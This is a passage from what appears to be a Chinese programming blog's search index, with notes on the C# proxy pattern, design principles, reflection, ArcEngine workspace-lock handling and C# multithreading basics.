class="line"></span><br><span class="line">    public void login()</span><br><span class="line">    &#123;</span><br><span class="line">        //do something</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//代理类同样实现接口，在方法执行前后可以添加其他处理</span><br><span class="line">public class UserControllerProxy : IUserController</span><br><span class="line">&#123;</span><br><span class="line">    IUserController userController = null;</span><br><span class="line">    public UserControllerProxy(IUserController userController)//传入实现该接口的对象</span><br><span class="line">    &#123;</span><br><span class="line">        this.userController = userController;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void login(string test)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;开始前&quot;);</span><br><span class="line">        userController.login(&quot;&quot;);</span><br><span class="line">        Console.WriteLine(&quot;开始后&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void register(string test)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;开始前&quot;);</span><br><span class="line">        userController.register(&quot;&quot;);</span><br><span class="line">        Console.WriteLine(&quot;开始后&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//使用示例</span><br><span class="line">UserControllerProxy userControllerProxy = new UserControllerProxy(new UserController());</span><br><span class="line">userControllerProxy.login();</span><br><span class="line">userControllerProxy.register();</span><br></pre></td></tr></table></figure><h4 id="通过继承实现"><a href="#通过继承实现" class="headerlink" title="通过继承实现"></a>通过继承实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="优劣对比"><a href="#优劣对比" class="headerlink" title="优劣对比"></a>优劣对比</h4><p>组合模式更灵活，对于接口的所有子类都可以代理。缺点是会【<strong>所有方法</strong>】都需要代理，不需要扩展的方法也需要。<br>继承模式的优点在于只针对需要的方法进行代理，缺点是只能针对单一父类进行代理。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>如果多个原始类都需要类似的代理，那么需要添加许多代理类，并且那些代理类都是类似的代码。所以需要动态代理，在运行时动态的创建原始类对应的代理类，然后再使用时用代理类替换原始类。</p><h4 id="Emit-运行时生成"><a href="#Emit-运行时生成" class="headerlink" title="Emit  运行时生成"></a>Emit  运行时生成</h4><p>Castle.DynamicProxy</p><h3 id="TransparentProxy-RealProxy"><a href="#TransparentProxy-RealProxy" class="headerlink" title="TransparentProxy/RealProxy"></a>TransparentProxy/RealProxy</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比较 </p><h2 id="copy链接"><a href="#copy链接" class="headerlink" title="copy链接"></a>copy链接</h2><p><a href="https://www.cnblogs.com/zuowj/p/7501896.html">1</a></p>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> AOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AOP </tag>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>00：工厂模式介绍</title>
      <link href="/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/00%EF%BC%9A%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D/"/>
      <url>/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/00%EF%BC%9A%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="01-使用哪些维度来评判代码质量？"><a href="#01-使用哪些维度来评判代码质量？" class="headerlink" title="01 使用哪些维度来评判代码质量？"></a>01 使用哪些维度来评判代码质量？</h3><ul><li>可维护性</li><li>可读性</li><li>可扩展性</li><li>灵活性：易扩展、易复用</li><li>简洁性</li><li>可复用性</li><li>可测试性<span id="more"></span><h3 id="03-面向对象、设计原则、设计模式、编程规范、重构，这五者有何关系？"><a href="#03-面向对象、设计原则、设计模式、编程规范、重构，这五者有何关系？" class="headerlink" title="03 面向对象、设计原则、设计模式、编程规范、重构，这五者有何关系？"></a>03 面向对象、设计原则、设计模式、编程规范、重构，这五者有何关系？</h3></li><li><strong>面向对象</strong>：具有封装、抽象、继承、多态的特性。</li><li><strong>设计原则</strong>：指导代码设计的经验总结，<strong>SOLID原则</strong><ul><li>SRP: 单一职责原则</li><li>OCP: 开闭原则</li><li>LSP: 里氏替换原则</li><li>ISP: 接口隔离原则</li><li>DIP: 依赖倒置原则</li><li>DRY原则、KISS原则、YAGNI原则、、LOD原则</li></ul></li><li><strong>设计模式</strong>: 根据经常遇到的设计问题，总结出来的一套解决方案或者设计思路。相比与设计原则，没有那么抽象。<ul><li><strong>创建型</strong>: 单例模式、工厂模式(工厂方法和抽象方法)、建造者模式、<em>原型模式</em></li><li><strong>结构性</strong>: 代理模式、桥接模式、装饰者模式、适配器模式、<em>门面模式</em>、<em>组合模式</em>、<em>享元模式</em></li><li><strong>行为型</strong>: 观察者模式、模板模式、策略模式、职责链模式、迭代器模式、状态模式、<em>访问者模式</em>、<em>备忘录模式</em>、<em>命令模式</em>、<em>解释器模式</em>、<em>中介模式</em></li></ul></li><li><strong>编码规范</strong>: 解决代码可读性问题。</li><li><strong>重构技巧</strong></li><li>需要了解重构的目的(why)、对象(what)、实际(when)、方法(how)</li><li>单元测试与代码的可测试性</li></ul><div style="text-alight:center"><img src="https://tva3.sinaimg.cn/large/005zbIM7ly1gnpg781i5gj30tp0na0yq.jpg" alt="编写高质量代码" width="1069" data-width="1069" data-height="838"></div><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><h3 id="理论一：面向对象"><a href="#理论一：面向对象" class="headerlink" title="理论一：面向对象"></a>理论一：面向对象</h3><p>面向对象的四个特性，面向对象分析和面向对象设计，UML</p><!-- ### 理论二：封装、抽象、继承、多态可以解决哪些编程问题？ -->]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c#问题：反射</title>
      <link href="/categories/C/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/c-%E9%97%AE%E9%A2%98%EF%BC%9A%E5%8F%8D%E5%B0%84/"/>
      <url>/categories/C/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/c-%E9%97%AE%E9%A2%98%EF%BC%9A%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="1-使用"><a href="#1-使用" class="headerlink" title="1. 使用"></a>1. 使用</h2><p>找到所有继承 InterfaceC 接口的类</p><span id="more"></span><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Assembly asm = Assembly.LoadFrom(dllPath); </span><br><span class="line"><span class="comment">//区别在于 LoadFrom 会将 dll文件相关依赖也加载进来？</span></span><br><span class="line"><span class="comment">//Assembly asm = Assembly.LoadFile(dllPath); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果有相同的a,b 两个dll文件，那么 InterfaceC 所在的Dll文件不能和</span></span><br><span class="line"><span class="comment">// 加载的接口和类必须在a,b两个文件里面。通过动态获取b文件的程序集（b文件引用同目录的c文件，c文件和a文件相同），与已添加引用的a文件获取的进行判断。</span></span><br><span class="line"><span class="keyword">var</span> types = asm.GetTypes().Where(<span class="function"><span class="params">t</span> =&gt;</span></span><br><span class="line">    typeof(InterfaceC).IsAssignableFrom(t)).ToArray(); <span class="comment">//更快</span></span><br><span class="line">    ).ToArray(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> types = asm.GetTypes().Where(<span class="function"><span class="params">t</span> =&gt;</span></span><br><span class="line">    t.GetInterfaces().<span class="built_in">Contains</span>(typeof(InterfaceC))</span><br><span class="line">    ).ToArray(); </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcEngine二次开发：Sample Code</title>
      <link href="/categories/GIS/ArcEngine%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/arcengine%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%EF%BC%9Asample-code/"/>
      <url>/categories/GIS/ArcEngine%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/arcengine%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%EF%BC%9Asample-code/</url>
      
        <content type="html"><![CDATA[<p>AE二次开发中，打开本地shp文件后，出现文件锁定状态，即后缀为 .sr.lock。</p><p><a href="https://blog.csdn.net/wsqplsh/article/details/79792687?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242">参考</a></p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">string dkpath = System.IO.Path.GetDirectoryName(dkPath);</span><br><span class="line">            string dkname = System.IO.Path.GetFileName(dkPath);</span><br><span class="line">            IWorkspaceFactory pwf = new ShapefileWorkspaceFactory();</span><br><span class="line">            //关闭资源锁定   </span><br><span class="line">            IWorkspaceFactoryLockControl ipWsFactoryLock = (IWorkspaceFactoryLockControl)pwf;//注意在java api中不能强转切记需要IWorkspaceFactoryLockControl ipWsFactoryLock = new IWorkspaceFactoryLockControlProxy(pwf);</span><br><span class="line">            if (ipWsFactoryLock.SchemaLockingEnabled)</span><br><span class="line">            &#123;</span><br><span class="line">                ipWsFactoryLock.DisableSchemaLocking();</span><br><span class="line">            &#125;</span><br><span class="line">            IWorkspace pw = pwf.OpenFromFile(dkpath, 0);</span><br><span class="line">            IFeatureWorkspace pfw = pw as IFeatureWorkspace;</span><br><span class="line">            IFeatureClass pfc = pfw.OpenFeatureClass(dkname);</span><br><span class="line">            IFeatureLayer pf = new FeatureLayerClass();</span><br><span class="line">            pf.FeatureClass = pfc;</span><br><span class="line">            pf.Name = &quot;DKXX&quot;;</span><br><span class="line">            ILayer pl = pf as ILayer;</span><br><span class="line">            m_FeatureLayer = pl as IFeatureLayer;</span><br><span class="line">            this.mcView.AddLayer(pl, 0);</span><br><span class="line">将解决文件锁定状态</span><br></pre></td></tr></table></figure><p>使用IWorkspaceFactoryLockControl接口关闭资源锁定，然后在使用完AE COM接口后，使用ComRelease释放COM接口即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">private void mnuItemUnlockFGDB_Click(object sender, EventArgs e)  </span><br><span class="line">&#123;  </span><br><span class="line">        IWorkspaceFactory2 ipWsFactory = new FileGDBWorkspaceFactoryClass();  </span><br><span class="line"> </span><br><span class="line">        //关闭资源锁定  </span><br><span class="line">    IWorkspaceFactoryLockControl ipWsFactoryLock;     </span><br><span class="line">    ipWsFactoryLock = (IWorkspaceFactoryLockControl)ipWsFactory;  </span><br><span class="line"> </span><br><span class="line">    if (ipWsFactoryLock.SchemaLockingEnabled)  </span><br><span class="line">    &#123;  </span><br><span class="line">        ipWsFactoryLock.DisableSchemaLocking();  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    String strConn = &quot;DATABASE=F:\\临时测试\\world.gdb&quot;;          </span><br><span class="line">    IWorkspace ipWorkspace = ipWsFactory.OpenFromString(strConn,0);  </span><br><span class="line">    IFeatureWorkspace ipFtWorkspace = (IFeatureWorkspace)ipWorkspace;  </span><br><span class="line">    IFeatureDataset ipFtDataset = ipFtWorkspace.OpenFeatureDataset(&quot;world&quot;);  </span><br><span class="line">    IEnumDataset ipEnumDataset = ipFtDataset.Subsets;  </span><br><span class="line">    ipEnumDataset.Reset();  </span><br><span class="line">    IDataset ipDataset = ipEnumDataset.Next();  </span><br><span class="line"> </span><br><span class="line">    while (ipDataset!=null)  </span><br><span class="line">    &#123;                 </span><br><span class="line">        IFeatureClass ipFtClass = (IFeatureClass)ipDataset;       </span><br><span class="line">        IFeatureLayer ipFtLayer = new FeatureLayerClass();            </span><br><span class="line">        ipFtLayer.FeatureClass = ipFtClass;               </span><br><span class="line">        ipFtLayer.Name = ipDataset.Name;  </span><br><span class="line">            //对图层做相关操作处理  </span><br><span class="line">        ipDataset = ipEnumDataset.Next();  </span><br><span class="line">        ComReleaser.ReleaseCOMObject(ipFtClass);      </span><br><span class="line">        ComReleaser.ReleaseCOMObject(ipFtLayer);  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipWorkspace);  </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipFtWorkspace);  </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipFtDataset);  </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipEnumDataset);  </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipDataset);  </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipWsFactory);  </span><br><span class="line">    ComReleaser.ReleaseCOMObject(ipWsFactoryLock);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ArcObjects Java code to unlock the Workspace</span></span><br><span class="line"></span><br><span class="line">scExport = getServerContext(); <span class="comment">// Open SDE Workspace</span></span><br><span class="line">IWorkspaceFactory sdeWkspFactory = <span class="keyword">new</span> IworkspaceFactoryProxy(scExport.createObject(“esriDataSourcesGDB.SdeWorkspaceFactory”));</span><br><span class="line"><span class="comment">// Open IworkspaceFactoryLockControlProxy object</span></span><br><span class="line">IWorkspaceFactoryLockControlProxy ipWsFactoryLockProxy = <span class="keyword">new</span> IWorkspaceFactoryLockControlProxy(sdeWkspFactory);</span><br><span class="line">ipWsFactoryLockProxy.disableSchemaLocking();</span><br><span class="line"><span class="function"><span class="keyword">public</span> IServerContext <span class="title">getServerContext</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IServerContext sc = <span class="keyword">null</span>;</span><br><span class="line">String server = Constants.getAGSServer();</span><br><span class="line">String user = Constants.getAGSUser();</span><br><span class="line">String pwd = Constants.getAGSPwd();</span><br><span class="line">String domain = Constants.getAGSDomain();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">ServerInitializer serverInitializer = <span class="keyword">new</span> ServerInitializer();</span><br><span class="line">serverInitializer.initializeServer(domain, user, pwd);</span><br><span class="line">ServerConnection connection = <span class="keyword">new</span> ServerConnection();</span><br><span class="line">connection.connect(server);</span><br><span class="line">IServerObjectManager som = connection.getServerObjectManager();</span><br><span class="line">sc = som.createServerContext(“”, “”);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">ex.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sc;</span><br></pre></td></tr></table></figure><p>？fealayer 释放 ，修改还原了？</p><p><a href="https://community.esri.com/t5/arcobjects-sdk-questions/esri-arcgis-geoprocessor-geoprocessor-unable-to-release-memory/td-p/154651">问答2</a></p><ol start="2"><li>数据编辑<br><a href="https://www.giserdqy.com/secdev/arcengine/26690/">ArcEngine 数据查询、数据操作总结</a></li></ol><p><a href="https://blog.csdn.net/yh0503/article/details/53493583">ArcEngine 数据查询、数据操作总结</a></p><ol start="3"><li></li></ol><p>获取空间参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ISpatialReference sourceSpatialReference = (featureClass as IGeoDataset).SpatialReference;</span><br><span class="line">string wkid = sourceSpatialReference.FactoryCode.ToString();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> GIS </category>
          
          <category> ArcEngine二次开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ArcEngine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4：c#教程-多线程</title>
      <link href="/categories/C/%E6%95%99%E7%A8%8B/4%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/categories/C/%E6%95%99%E7%A8%8B/4%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="4-1-多线程开发"><a href="#4-1-多线程开发" class="headerlink" title="4.1 多线程开发"></a>4.1 多线程开发</h2><p>线程与线程函数</p><blockquote><p>把分割出来的工作任务封装为一个函数，由线程负责执行。线程的运行过程体现为线程函数的运行过程。</p></blockquote><span id="more"></span><h3 id="4-1-1-多线程开发基础知识"><a href="#4-1-1-多线程开发基础知识" class="headerlink" title="4.1.1 多线程开发基础知识"></a>4.1.1 多线程开发基础知识</h3><ul><li><p>线程对象的创建与运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MyClass obj= new MyClass();</span><br><span class="line">//原始写法</span><br><span class="line">Thread th1 = new Thread(new ThreadStart(MyClass.StaticMethod)); //委托-静态方法</span><br><span class="line">Thread th2 = new Thread(new ThreadStart(obj.InstanceMethod))// 委托-实例化方法</span><br><span class="line"></span><br><span class="line">//简化写法</span><br><span class="line">Thread th3 = new Thread(MyClass.StaticMethod);</span><br><span class="line">Thread th4 = new Thread(obj.InstanceMethod);</span><br><span class="line"></span><br><span class="line">//Lambda表达式</span><br><span class="line">Thread th5 = new Thread(()=&gt;&#123;</span><br><span class="line">    //线程函数</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>多线程基本方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">th.start() // 执行线程</span><br><span class="line">Thread.CurrentThread  //可获取负责执行当前函数的线程对象引用</span><br><span class="line">Thread.ManagedThreadID // 每个线程都有一个ID</span><br><span class="line">Thread.Sleep(number)  //当前线程暂停，进入阻塞状态，可能影响性能。number为时间，单位是毫秒</span><br><span class="line">Thread.SpinSLeep(number) //让CPU空转，但线程状态不改变(不进入阻塞状态)，只适合暂停很短时间时使用，小于1s</span><br><span class="line">th.Abort()  //提前终止线程,一般不用</span><br><span class="line">th.IsBackground  //设置属性为true的线程称为背景线程；背景线程在主线程结束时自动中断执行；默认为False，即“前台线程”，CLR会等待所有前台线程结束后才会结束整个线程。</span><br><span class="line">th.Join()  //把线程嵌入到当值执行的线程中，当前线程会等待th线程执行完毕后再继续(需先th.start())，不推荐使用，容易造成死锁。Join就是插队的意思</span><br><span class="line">//线程状态: 托管线程 不与 操作系统的原始线程 一一对应</span><br></pre></td></tr></table></figure></li><li><p>线程终止时,如何清理？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public void SomeLongTask()&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        System.Console.WriteLine(&quot;辅助线程开始。。。&quot;);</span><br><span class="line">    &#125;catch(ThreadAbortException e)&#123;  //需要捕获线程终止异常</span><br><span class="line">        System.Console.WriteLine(&quot;辅助线程被提前终端：&#123;0&#125;&quot;,e.Message);</span><br><span class="line">        Thread.ResetAbort(); //不加此句，CLR会再次抛出这个异常，从而导致函数最后函数最后一句代码不会执行</span><br><span class="line">    &#125;finally&#123;</span><br><span class="line">        System.Console.WriteLine(&quot;此时完成清理辅助线程占用的资源工作&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    System.Console.WriteLine(&quot;辅助线程结束&quot;); //不加 ResetAbort() 不会执行到此句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-1-2-多线程开发基本技巧"><a href="#4-1-2-多线程开发基本技巧" class="headerlink" title="4.1.2 多线程开发基本技巧"></a>4.1.2 多线程开发基本技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Thread(ThreadStart start);  //ThreadStart是委托，接收的函数不能有参数和返回值</span><br></pre></td></tr></table></figure><h4 id="如何接收带参数的线程函数？"><a href="#如何接收带参数的线程函数？" class="headerlink" title="如何接收带参数的线程函数？"></a>如何接收带参数的线程函数？</h4><ol><li>外套函数(缺点：1.字段共有，违背面向对象的“封装”原则；2.如果有多个方法，则字段数目爆炸)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class MyThread&#123;</span><br><span class="line">    //带参数和返回值的函数</span><br><span class="line">    public long SomeFunc(int xx, int yy)&#123;</span><br><span class="line">        return xx + yy;</span><br><span class="line">    &#125;</span><br><span class="line">    //将SomeFunc参数和返回值外化为类的共有字段</span><br><span class="line">    public int x;</span><br><span class="line">    public int y;</span><br><span class="line">    public long returnValue;</span><br><span class="line">    //供多线程调用的“外套”番薯</span><br><span class="line">    public void ThreadMethod()&#123;</span><br><span class="line">        returnValue = SomeFunc(x,y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//使用时，先设置x，y的值，再调用线程，完成后获取returnValue</span><br><span class="line">MyThread obj = new MyThread()&#123;</span><br><span class="line">    x = 100, y = 120</span><br><span class="line">&#125;</span><br><span class="line">Thread th = new Thread(MyThread.ThreadMethod);</span><br><span class="line">th.Start();</span><br><span class="line">th.Join();</span><br><span class="line">Console.WriteLine(obj.returnValue);</span><br></pre></td></tr></table></figure></li><li>使用ParameterizedThreadStart委托（只接收一个object参数，需要创建参数辅助类ThreadMethodHelper）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">//单参数无返回值时，直接改写函数</span><br><span class="line">void Func(int x)&#123;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br><span class="line">//==&gt;</span><br><span class="line">static void Func(object x)&#123;</span><br><span class="line">    int argu = Convert.ToInt32(x);</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br><span class="line">Thread th = new Thread(new ParameterizedThreadStart(Func));</span><br><span class="line">th.Start();</span><br><span class="line"></span><br><span class="line">//多参数有返回值，使用参数辅助类</span><br><span class="line">long SomeFunc(int x,int y )&#123;</span><br><span class="line">    long ret = 0;</span><br><span class="line">    // ...</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line">//==&gt;</span><br><span class="line">class ThreadMethodHelper&#123;</span><br><span class="line">    //线程输入参数</span><br><span class="line">    public int x;</span><br><span class="line">    public int y;</span><br><span class="line">    //函数返回值</span><br><span class="line">    public long returnValue;</span><br><span class="line">&#125;</span><br><span class="line">public void SomeFunc(object argu)&#123;</span><br><span class="line">    int x = (argu as ThreadMethodHelper).x;</span><br><span class="line">    int y = (argu as ThreadMethodHelper).y;</span><br><span class="line">    //...</span><br><span class="line">    returnvalue = x +y ;</span><br><span class="line">    (argu as ThreadMethodHelper).returnValue = returnvalue</span><br><span class="line">&#125;</span><br><span class="line">//使用</span><br><span class="line">var argu = new ThreadMethodHelper();</span><br><span class="line">argu.x = 100; argu.y = 120;</span><br><span class="line">Thread th = new Thread(new ParameterizedThreadStart(SomeFunc));</span><br><span class="line">th.Start(argu);</span><br><span class="line">th.Join();</span><br><span class="line">Console.WriteLine(argu.returnValue); //取回线程结果</span><br></pre></td></tr></table></figure></li></ol><h4 id="利用多线程回调"><a href="#利用多线程回调" class="headerlink" title="利用多线程回调"></a>利用多线程回调</h4>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2：c#教程-重构</title>
      <link href="/categories/C/%E6%95%99%E7%A8%8B/2%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E9%87%8D%E6%9E%84/"/>
      <url>/categories/C/%E6%95%99%E7%A8%8B/2%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E9%87%8D%E6%9E%84/</url>
      
